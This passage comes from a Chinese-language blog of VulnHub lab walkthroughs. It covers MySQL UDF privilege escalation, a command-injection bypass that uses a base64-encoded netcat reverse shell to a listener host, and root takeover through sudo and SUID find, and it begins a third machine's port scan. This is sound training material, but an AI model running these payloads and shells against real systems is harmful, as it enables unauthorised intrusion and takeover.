ALL</span><br></pre></td></tr></table></figure>
<p>sudo提权</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -i</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root),27(sudo)</span><br></pre></td></tr></table></figure>
<hr />
<blockquote>
<p>Mysql UDF提权</p>
</blockquote>
<p>拿到yash账户后提权遇到瓶颈，上传了脚本linuxprivchecker，运行过后报告可能存在Mysql的UDF提权的可能<br />
查阅了相关资料之后发现几个问题</p>
<ul>
<li>需要root账户</li>
<li>secure_file_priv</li>
<li>plugin_dir</li>
</ul>
<p>可以先在wordpress的配置文件中获取账户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;www&#x2F;html&#x2F;wordpress&#x2F;wp-config.php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ** MySQL settings - You can get this info from your web host ** &#x2F;&#x2F;</span><br><span class="line">&#x2F;** The name of the database for WordPress *&#x2F;</span><br><span class="line">define( &#39;DB_NAME&#39;, &#39;wordpress&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** MySQL database username *&#x2F;</span><br><span class="line">define( &#39;DB_USER&#39;, &#39;wordpressuser&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** MySQL database password *&#x2F;</span><br><span class="line">define( &#39;DB_PASSWORD&#39;, &#39;cry4moon&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** MySQL hostname *&#x2F;</span><br><span class="line">define( &#39;DB_HOST&#39;, &#39;localhost&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** Database Charset to use in creating database tables. *&#x2F;</span><br><span class="line">define( &#39;DB_CHARSET&#39;, &#39;utf8&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** The Database Collate type. Don&#39;t change this if in doubt. *&#x2F;</span><br><span class="line">define( &#39;DB_COLLATE&#39;, &#39;&#39; );</span><br></pre></td></tr></table></figure>
<p>拿到账户之后再使用mysql客户端登入服务<br />
<code>mysql -h localhost -u wordpressuser -pcry4moon</code><br />
再查看root账户的密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select host,user,authentication_string from mysql.user;</span><br><span class="line">+---------------+------------------+-------------------------------------------+</span><br><span class="line">| host          | user             | authentication_string                     |</span><br><span class="line">+---------------+------------------+-------------------------------------------+</span><br><span class="line">| localhost     | root             | *4A247A535BAD910307E7DAA7A32A65C2A86D91AC |</span><br><span class="line">| localhost     | mysql.session    | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |</span><br><span class="line">| localhost     | mysql.sys        | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |</span><br><span class="line">| localhost     | debian-sys-maint | *2A702E4018EF99C245B5DC4E753531720BDC94E0 |</span><br><span class="line">| %             | haclabs          | *1565CEE976A27D283F4ECF1EC2AEE11E71C8D208 |</span><br><span class="line">| localhost     | phpmyadmin       | *4A247A535BAD910307E7DAA7A32A65C2A86D91AC |</span><br><span class="line">| wordpressuser | wordpress        | *4A247A535BAD910307E7DAA7A32A65C2A86D91AC |</span><br><span class="line">| localhost     | wordpress        | *4A247A535BAD910307E7DAA7A32A65C2A86D91AC |</span><br><span class="line">| localhost     | wordpressuser    | *4A247A535BAD910307E7DAA7A32A65C2A86D91AC |</span><br><span class="line">+---------------+------------------+-------------------------------------------+</span><br><span class="line">9 rows in set (0.20 sec)</span><br></pre></td></tr></table></figure>
<p>可以看到localhost账户的密码hash和wordpressuser的一样，即都是<code>cry4moon</code><br />
但是无法登入，测试时重新设置了密码，操作如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">update mysql.user set authentication_string&#x3D;PASSWORD(&quot;cry4moon&quot;) where user&#x3D;&#39;root&#39;;</span><br><span class="line">update mysql.user set plugin&#x3D;&quot;mysql_native_password&quot;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>
<p>完成更改密码之后即可以root账户登入</p>
<p>而UDF提权则需要在插件目录写入文件，关于目录可以用以下命令查阅</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &#39;plugin_dir&#39;;</span><br><span class="line">+---------------+------------------------+</span><br><span class="line">| Variable_name | Value                  |</span><br><span class="line">+---------------+------------------------+</span><br><span class="line">| plugin_dir    | &#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F; |</span><br><span class="line">+---------------+------------------------+</span><br><span class="line">1 row in set (0.07 sec)</span><br></pre></td></tr></table></figure>
<p>即<code>/usr/lib/mysql/plugin/</code></p>
<p>而在写入文件时会发生错误，原因是<code>secure_file_priv</code>参数对于文件写入存在限制</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</span><br><span class="line">+------------------+-----------------------+</span><br><span class="line">| Variable_name    | Value                 |</span><br><span class="line">+------------------+-----------------------+</span><br><span class="line">| secure_file_priv | &#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F; |</span><br><span class="line">+------------------+-----------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure>
<p>即只能写入目录<code>/var/lib/mysql-files/</code>，子目录下也不行</p>
<ul>
<li>若该值为空，则无限制</li>
<li>若该值为NULL，则不可写入</li>
</ul>
<p>提权需要将文件作为插件写入plugin_dir，但与参数<code>secure_file_priv</code>冲突，故写入时会报错。而参数<code>secure_file_priv</code>为只读参数，不能再mysql客户端中更改，只能修改mysqld.cnf，写入&quot;secure_file_priv=&quot;，并且重启mysql服务，才能继续进行UDF提权。</p>
<p>之后发生玄学运维，手动修改了secure_file_priv参数，权限777的路径写入文件会报错权限否认，手动移动的so文件可以载入但是不能执行命令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">create table foo(line blob);</span><br><span class="line">insert into foo values(load_file(&#39;&#x2F;tmp&#x2F;udf.so&#39;));</span><br><span class="line">select * from foo into dumpfile &#39;%plugin_dir%&#x2F;udf.so&#39;;</span><br><span class="line">create function sys_eval returns string soname &#39;udf2.so&#39;;</span><br><span class="line">select sys_eval(&#39;id&#39;);</span><br></pre></td></tr></table></figure>
<p>linux下的so文件与windows下的dll文件在MSF中都有附带</p>
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.hacknos.com/haclabs-deception-walkthrough-vulnhub/">WP</a><br />
<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/84863268">UDF</a><br />
<a target="_blank" rel="noopener" href="https://www.cnblogs.com/mrhonest/p/10836621.html">UDF</a><br />
<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Tdazheng/p/10742929.html">Mysql.pass</a></p>
</blockquote>
<hr />
<h1 id="no_name"><a class="markdownIt-Anchor" href="#no_name"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/haclabs-no_name,429/">no_name</a></h1>
<p><code>2020/03/27 01:05:37</code></p>
<h2 id="端口扫描-13"><a class="markdownIt-Anchor" href="#端口扫描-13"></a> 端口扫描</h2>
<p><code>nmap -p 1-65535 -T5 -sV -A -n -v 192.168.31.196</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.196</span><br><span class="line">Host is up (0.00048s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 78:2b:f7:57:bf:da:fd:ec:e0:d5:60:c4:8b:53:62:fd (RSA)</span><br><span class="line">|   256 36:82:4a:8b:71:f7:78:da:49:42:f9:88:6d:26:73:6a (ECDSA)</span><br><span class="line">|_  256 dc:18:8e:b3:36:53:cb:10:34:98:57:3d:f0:a1:2b:ad (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html; charset&#x3D;UTF-8).</span><br><span class="line">MAC Address: 08:00:27:59:63:EF (Oracle VirtualBox virtual NIC)</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Uptime guess: 18.412 days (since Sun Mar  8 03:06:40 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;261 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
<h2 id="web路径枚举-13"><a class="markdownIt-Anchor" href="#web路径枚举-13"></a> Web路径枚举</h2>
<p>尝试爆破80端口下的Web路径</p>
<p><code>dirb http://192.168.31.196/ -w</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.196&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.196&#x2F;admin (CODE:200|SIZE:417)                                            </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.196&#x2F;index.php (CODE:200|SIZE:201)                                        </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.196&#x2F;server-status (CODE:403|SIZE:279)</span><br></pre></td></tr></table></figure>
<p>访问<code>/index.php</code></p>
<ul>
<li>显示<code>Fake Admin Area</code></li>
<li>任意提交查询则回显<code>Fake ping executed</code></li>
</ul>
<p>访问<code>/admin</code></p>
<ul>
<li>有四个图片文件</li>
<li>源代码中有提示信息<code>passphrase:harder</code></li>
</ul>
<h2 id="漏洞利用-13"><a class="markdownIt-Anchor" href="#漏洞利用-13"></a> 漏洞利用</h2>
<p>使用<code>steghide</code>工具进行分析<br />
发现图片文件<code>haclabs.jpeg</code>存在隐写</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf haclabs.jpeg  -p harder</span><br><span class="line">	wrote extracted data to &quot;imp.txt&quot;.</span><br><span class="line">cat imp.txt </span><br><span class="line">	c3VwZXJhZG1pbi5waHA&#x3D;</span><br><span class="line">echo &quot;c3VwZXJhZG1pbi5waHA&#x3D;&quot; | base64 -d</span><br><span class="line">	superadmin.php</span><br></pre></td></tr></table></figure>
<p>访问<code>/superadmin.php</code></p>
<ul>
<li>存在ping功能</li>
</ul>
<p>尝试进行命令注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">| cat superadmin.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">   if (isset($_POST[&#39;submitt&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">   	$word&#x3D;array(&quot;;&quot;,&quot;&amp;&amp;&quot;,&quot;&#x2F;&quot;,&quot;bin&quot;,&quot;&amp;&quot;,&quot; &amp;&amp;&quot;,&quot;ls&quot;,&quot;nc&quot;,&quot;dir&quot;,&quot;pwd&quot;);</span><br><span class="line">   	$pinged&#x3D;$_POST[&#39;pinger&#39;];</span><br><span class="line">   	$newStr &#x3D; str_replace($word, &quot;&quot;, $pinged);</span><br><span class="line">   	if(strcmp($pinged, $newStr) &#x3D;&#x3D; 0)</span><br><span class="line">		&#123;</span><br><span class="line">		    $flag&#x3D;1;</span><br><span class="line">		&#125;</span><br><span class="line">       else</span><br><span class="line">		&#123;</span><br><span class="line">		   $flag&#x3D;0;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($flag&#x3D;&#x3D;1)&#123;</span><br><span class="line">$outer&#x3D;shell_exec(&quot;ping -c 3 $pinged&quot;);</span><br><span class="line">echo &quot;$outer&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>有两种获取shell的方法</p>
<ul>
<li>使用wget下载php一句话木马</li>
<li>使用nc反弹shell</li>
</ul>
<p>过滤可以使用base64编码进行绕过<br />
<code>|echo &quot;xxxx&quot;|base64 -d|bash</code><br />
xxxx即为要执行的命令的base64编码的结果</p>
<p><strong>wget</strong><br />
写入文件失败，可能没有权限</p>
<p><strong>nc</strong></p>
<p>监听端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9900</span><br></pre></td></tr></table></figure>
<p>构造payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;nc.traditional -e &#x2F;bin&#x2F;bash 192.168.31.10 9900&quot; | base64</span><br><span class="line">	bmMudHJhZGl0aW9uYWwgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMzEuMTAgOTkwMAo&#x3D;</span><br></pre></td></tr></table></figure>
<p>执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|echo &quot;bmMudHJhZGl0aW9uYWwgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMzEuMTAgOTkwMAo&#x3D;&quot;|base64 -d|bash</span><br></pre></td></tr></table></figure>
<p>接收到反弹shell</p>
<h2 id="权限提升-13"><a class="markdownIt-Anchor" href="#权限提升-13"></a> 权限提升</h2>
<p>获取pty</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
<p>在yash的home目录发现flag1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;home&#x2F;yash&#x2F;flag1.txt</span><br><span class="line">Due to some security issues,I have saved haclabs password in a hidden file.</span><br></pre></td></tr></table></figure>
<p>搜索拥有者为yash的文件/文件夹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -user yash 2&gt; &#x2F;dev&#x2F;null</span><br><span class="line">&#x2F;home&#x2F;yash</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;flag1.txt</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.bashrc</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.cache</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.cache&#x2F;motd.legal-displayed</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.profile</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.bash_history</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.gnupg</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.gnupg&#x2F;private-keys-v1.d</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.local</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.local&#x2F;share</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.local&#x2F;share&#x2F;nano</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;hidden</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;hidden&#x2F;.passwd</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;usr&#x2F;share&#x2F;hidden&#x2F;.passwd</span><br><span class="line">haclabs1234</span><br></pre></td></tr></table></figure>
<p>切换账户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su haclabs</span><br><span class="line">haclabs1234</span><br></pre></td></tr></table></figure>
<p>查看sudo权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for haclabs on haclabs:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User haclabs may run the following commands on haclabs:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;find</span><br></pre></td></tr></table></figure>
<p>可以使用find命令进行提权</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root find &#x2F;etc&#x2F;passwd -exec passwd root \;</span><br><span class="line">hackforfun</span><br><span class="line">hackforfun</span><br><span class="line">su root</span><br><span class="line">hackforfun</span><br><span class="line">id</span><br><span class="line">	uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure>
<hr />
<blockquote>
<p>SUID-find</p>
</blockquote>
<p>其实在<code>www-data</code>权限时就可以使用find命令进行操作</p>
<p>查看SUID</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;find</span><br></pre></td></tr></table></figure>
<p>可以通过find命令来进行读取</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F;etc&#x2F;passwd -exec ls -la &#x2F;root \;</span><br><span class="line"></span><br><span class="line">total 40</span><br><span class="line">drwx------  6 root root 4096 Feb 15 16:28 .</span><br><span class="line">drwxr-xr-x 25 root root 4096 Mar 26 17:07 ..</span><br><span class="line">-rw-------  1 root root   41 Mar 26 17:22 .bash_history</span><br><span class="line">-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc</span><br><span class="line">drwx------  2 root root 4096 Jan 30 06:53 .cache</span><br><span class="line">drwx------  5 root root 4096 Jan 30 03:06 .config</span><br><span class="line">drwx------  3 root root 4096 Jan 27 16:46 .gnupg</span><br><span class="line">drwxr-xr-x  3 root root 4096 Jan 27 16:56 .local</span><br><span class="line">-rw-r--r--  1 root root  148 Aug 17  2015 .profile</span><br><span class="line">-rw-r--r--  1 root root   97 Jan 30 04:29 flag3.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F;etc&#x2F;passwd -exec cat &#x2F;root&#x2F;flag3.txt \;</span><br><span class="line"></span><br><span class="line">Congrats!!!You completed the challenege!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">						   ()    ()</span><br><span class="line"></span><br><span class="line">						 \	      &#x2F;</span><br><span class="line">						  ----------</span><br></pre></td></tr></table></figure>
<p>但是通过find来命令执行时存在限制的，并不是完全以root账户的身份去执行</p>
<p>在本地测试之后得出如下结论</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">读取：***</span><br><span class="line">写入：**2</span><br><span class="line">执行：**4(bash); 1**, *1*, **1(exec)</span><br></pre></td></tr></table></figure>
<ul>
<li>*** 分别代表权限的三位，其中*为通配，表示任意权限</li>
<li>**2， linux中的权限可以线性叠加，**2即代表需要仅写权限，在**3, **6, **7的情况下也是适用的</li>
<li>bash意为该文件作为bash的参数来执行(bash <a target="_blank" rel="noopener" href="http://run.sh">run.sh</a>)，exec则表示作为可执行程序来执行(./run.sh)</li>
</ul>
<p>由此看来应当是继承了root的r-x权限，但是直接获取bash则还是以原用户的身份来获取，并不能获取root权限的bash；也不能通过passwd来修改root账户的密码(即使euid=0)</p>
<blockquote>
<p>nc.traditional/nc</p>
</blockquote>
<ul>
<li>nc.traditional是最早的版本(v1.10-41.1)，该版本具有<code>-e</code>的选项，用于反弹shell十分方便</li>
<li>ubuntu中的nc命令则会指向netcat-openbsd，而该版本则没有<code>-e</code>的选项，无法用于反弹shell</li>
<li>ncat的版本则比较新，集成于nmap中</li>
</ul>
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-shell.html">exec</a><br />
<a target="_blank" rel="noopener" href="https://www.hacknos.com/haclabs-no_name-walkthrough-vulnhub-ctf/">WP</a><br />
<a target="_blank" rel="noopener" href="https://www.sqlsec.com/2019/10/nc.html">nc</a></p>
</blockquote>
<h1 id="tbbt-funwithflags"><a class="markdownIt-Anchor" href="#tbbt-funwithflags"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/tbbt-funwithflags,437/">TBBT-FunWithFlags</a></h1>
<p><code>2020/03/31 13:24:54</code></p>
<blockquote>
<p>靶机未启用DHCP，故使用了默认的静态IP:192.168.1.105。若本机网段不是192.168.1.*，需要在VB中创建一个192.168.1.*网段的Host-Only Ethernet Adapter</p>
</blockquote>
<h2 id="端口扫描-14"><a class="markdownIt-Anchor" href="#端口扫描-14"></a> 端口扫描</h2>
<p><code>nmap -p 1-65535 -A -sV -T5 -n -v 192.168.1.105</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.1.105</span><br><span class="line">Host is up (0.00047s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21&#x2F;tcp   open  ftp     vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| -rw-r--r--    1 ftp      ftp           539 Mar 04 01:11 Welcome.txt</span><br><span class="line">| -rw-r--r--    1 ftp      ftp           114 Mar 04 01:13 ftp_agreement.txt</span><br><span class="line">|_drwxr-xr-x    9 ftp      ftp          4096 Mar 04 01:09 pub</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.1.3</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 1</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22&#x2F;tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 cf:5c:ee:76:7c:48:52:06:8d:56:07:7f:f6:5d:80:f2 (RSA)</span><br><span class="line">|   256 ab:bb:fa:f9:89:99:02:9e:e4:20:fa:37:4f:6f:ca:ca (ECDSA)</span><br><span class="line">|_  256 ea:6d:77:f3:ff:9c:d5:dd:85:e3:1e:75:3c:7b:66:47 (ED25519)</span><br><span class="line">80&#x2F;tcp   open  http    Apache httpd 2.4.18 